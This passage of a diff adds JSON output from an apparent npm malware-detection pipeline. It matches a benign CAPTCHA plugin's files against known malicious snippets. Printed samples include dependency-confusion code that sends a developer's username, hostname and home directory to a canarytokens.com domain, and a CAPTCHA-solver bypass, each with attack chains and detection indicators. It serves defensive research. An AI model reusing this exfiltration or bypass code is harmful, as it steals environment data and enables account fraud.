+                    "HTML attachments or web pages with Microsoft 365 branding but source code or form actions pointing to non-Microsoft domains",
+                    "PDF documents containing QR codes that resolve to suspicious or non-Microsoft URLs",
+                    "JavaScript files or inline scripts with heavy obfuscation, Base64-encoded strings, or dynamic script loading from unfamiliar domains"
+                  ],
+                  "network_indicators": [
+                    "AJAX or fetch requests to attacker-controlled domains (e.g., attacker.com, cdn.attacker.com) not associated with Microsoft",
+                    "Outbound connections to api.telegram.org with embedded bot tokens and chat IDs",
+                    "Dynamic script loading from domains not associated with trusted CDNs or Microsoft infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for phishing emails or PDF attachments containing QR codes that direct users to non-Microsoft login pages. Analyze web traffic for AJAX POST requests with encrypted payloads (such as AES-encrypted JSON) to unknown or suspicious domains, especially following credential or MFA input. Flag any use of the Telegram Bot API for outbound notifications from web pages, particularly when containing credential data. Detect obfuscated JavaScript and dynamic script loading from non-standard or attacker-controlled sources. Employ sandboxing and behavioral analysis to identify anti-bot and CAPTCHA evasion logic, and correlate with file and network indicators for comprehensive detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113202_101350_snippet_3",
+              "source_package": "Akamai WEB and BMP API (underground botting tool) (N/A (proprietary/underground tool, not a public package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113202_101350/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4214756488800049,
+              "code_similarity": 0.3348429203033447,
+              "behavior_similarity": 0.508108377456665,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "CAPTCHA solving via third-party API:\nconst solution = await fetch('https://solver-service.com/api/solve', { method: 'POST', body: captchaImage });\nawait page.type('#captcha', solution.token);",
+                "code_behavior": "At runtime, the code sends CAPTCHA images to a third-party solver API, receives the solution token, and programmatically inputs the solution into the CAPTCHA field on the target site, enabling automated bypass of anti-bot protections.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of external CAPTCHA solver APIs is a well-known method for circumventing anti-bot mechanisms, allowing automated scripts to proceed where human verification is required.",
+                  "violated_expectations": "Legitimate automation does not attempt to bypass CAPTCHA challenges in production environments; such bypassing is a clear indicator of malicious automation.",
+                  "similar_legitimate_use": "Accessibility tools for users with disabilities may assist with CAPTCHAs, but not at the scale or automation level seen here.",
+                  "key_indicators": [
+                    "Outbound HTTP requests to known CAPTCHA solver API endpoints",
+                    "Automated population of CAPTCHA solution fields",
+                    "Integration of CAPTCHA image capture and submission logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during anti-bot bypass)",
+                  "file_location": "anti-bot bypass modules or API integration code",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Akamai WEB and BMP API (underground botting tool)",
+                  "package_manager": "N/A (proprietary/underground tool, not a public package manager)",
+                  "package_versions": "Unknown (likely multiple, as updated for bypasses)",
+                  "why_malicious": "This tool is explicitly designed and marketed for bypassing anti-bot protections on major retail and sneaker sites, enabling automated credential stuffing, account takeover, and fake account generation attacks. Its features and underground distribution indicate intent to facilitate fraud, large-scale abuse, and unauthorized access to protected resources."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obtain or purchase credential lists and/or fake account generation methods.",
+                    "implemented_by": [],
+                    "leads_to": "Automated attack execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Automate login attempts using credential stuffing or credential cracking.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Account takeover or credential validation"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Automate fake account creation to scale fraud or abuse.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Mass fake accounts for fraud, laundering, or abuse"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Bypass anti-bot protections using CAPTCHA solver services.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Uninterrupted automation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Evade detection by rotating proxies and spoofing browser fingerprints.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sustained, undetected attack activity"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Monetize compromised or fake accounts (sell, launder, abuse).",
+                    "implemented_by": [],
+                    "leads_to": "Financial gain for attacker"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "High volume of login attempts from diverse IP addresses and user agents within short timeframes",
+                    "Rapid, repeated account creation attempts with similar registration patterns and generated data",
+                    "Frequent use of residential proxies and observable proxy rotation during sessions",
+                    "Automated CAPTCHA solving via outbound requests to known solver API domains"
+                  ],
+                  "file_indicators": [
+                    "Automation scripts referencing Puppeteer, Playwright, or Selenium libraries",
+                    "Configuration files or scripts containing proxy lists, credential input, or fingerprint spoofing logic",
+                    "Hardcoded or dynamically referenced solver service API endpoints in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP(S) connections to CAPTCHA solver service domains (e.g., solver-service.com)",
+                    "Frequent IP address changes associated with residential proxy providers during authentication or registration flows",
+                    "Unusual spikes in login or registration traffic from IPs with inconsistent geolocation or user agent strings"
+                  ],
+                  "how_to_detect": "Monitor authentication and registration endpoints for high-frequency attempts from varying IP addresses and user agents, especially those matching residential proxy ranges. Flag HTTP headers or browser fingerprints indicative of automation tools (e.g., Puppeteer/Playwright). Detect outbound network requests to known CAPTCHA solver API domains. Correlate rapid account creation or login failures with proxy and fingerprint rotation patterns to identify automated abuse."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456059_snippet_1",
+              "source_package": "deere-ui-domain-framework-mixins (and 16 others, see list) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41936931014060974,
+              "code_similarity": 0.3928564190864563,
+              "behavior_similarity": 0.4458822011947632,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst package = packageJSON.name;\n\nconst trackingData = JSON.stringify({\n  c: package,\n  h: os.homedir(),\n  d: os.hostname(),\n  hn: os.hostname(),\n  os: os.userInfo().username,\n  dns: os.getServers(),\n  v: packageJSON.version,\n  r: packageJSON._resolved || undefined,\n  pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\n\nvar options = {\n  hostname: `${whoami}.${hostname}.duif.L4.[redacted].canarytokens.com`,\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time or during postinstall, the code collects local system and user information (including username, hostname, home directory, DNS servers, and package metadata), serializes it, and sends it via an outbound HTTPS POST request to a canarytokens.com domain controlled by the attacker, resulting in exfiltration of internal environment details.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically gathers sensitive host and user data and transmits it to an external domain without user knowledge or consent. This is a clear indicator of malicious intent, as legitimate packages do not require or perform such actions during installation or import.",
+                  "violated_expectations": "Standard npm packages do not collect or exfiltrate environment or user data to external servers during install or import. Such behavior is a direct violation of user privacy and security best practices, and is not expected in any legitimate package, especially without explicit user opt-in and documentation.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting libraries may collect limited environment data, but only after explicit user consent and with transparent documentation. They never perform silent data exfiltration during install/import, and always provide opt-out mechanisms.",
+                  "key_indicators": [
+                    "Collection of sensitive OS data: os.homedir(), os.hostname(), os.userInfo().username",
+                    "Use of canarytokens.com or similar external tracking domains as exfiltration endpoints",
+                    "Outbound HTTPS POST request triggered at install/import time",
+                    "No user notification, consent, or documentation of data collection or transmission",
+                    "Combination of os, dns, https, and querystring modules in the package entrypoint"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or postinstall (depending on how the package is used)",
+                  "file_location": "index.js (main entry point of the package)",
+                  "required_permissions": [
+                    "network access (outbound HTTPS)",
+                    "read access to environment variables",
+                    "read access to OS user and host information"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "deere-ui-domain-framework-mixins (and 16 others, see list)",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.2, 1.0.0 (and similar for all listed packages)",
+                  "why_malicious": "These packages are dependency confusion payloads crafted to impersonate John Deere's internal/private npm dependencies. Upon installation or import, they execute code that collects sensitive host and user environment information and exfiltrates it to an attacker-controlled canarytokens.com domain. This behavior constitutes a supply chain attack, as it enables the attacker to confirm internal package usage and gather reconnaissance data from developer or CI environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A malicious package is installed as a result of dependency confusion, where the public package name matches an internal/private dependency used by the target organization.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the package's code on the developer's machine or CI system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation or import, the package executes code that collects local system and environment information, including user and host details.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is serialized and sent via an outbound HTTPS POST request to an attacker-controlled canarytokens.com domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives notification and detailed environment information, confirming successful dependency confusion and internal package usage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package that collects OS/user/environment data (e.g., os.homedir(), os.hostname(), os.userInfo().username) at install or import time",
+                    "Network requests to canarytokens.com or similar tracking domains during npm install or import",
+                    "Use of os, dns, https, and querystring modules together in the package entrypoint to facilitate data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entrypoint file containing references to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded references to canarytokens.com or similar external tracking domains in code",
+                    "Presence of code that performs outbound HTTPS POST requests to external domains in the package entrypoint"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.canarytokens.com domains during npm install or import",
+                    "Unusual DNS lookups or outbound connections to external tracking domains (e.g., canarytokens.com) initiated by npm packages"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for unexpected outbound network activity, especially HTTPS POST requests to canarytokens.com or similar domains. Statistically analyze package entrypoints (such as index.js) for the combined use of os, dns, https, and querystring modules, and for code that collects and transmits environment data. Flag any package that performs network exfiltration of host/user information during install/import, particularly if such behavior is undocumented or unnecessary for the package's stated purpose."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/public/js/admin.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/public/js/register.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/public/js/scripts.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/upgrades/enable_stopforumspam_by_default.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
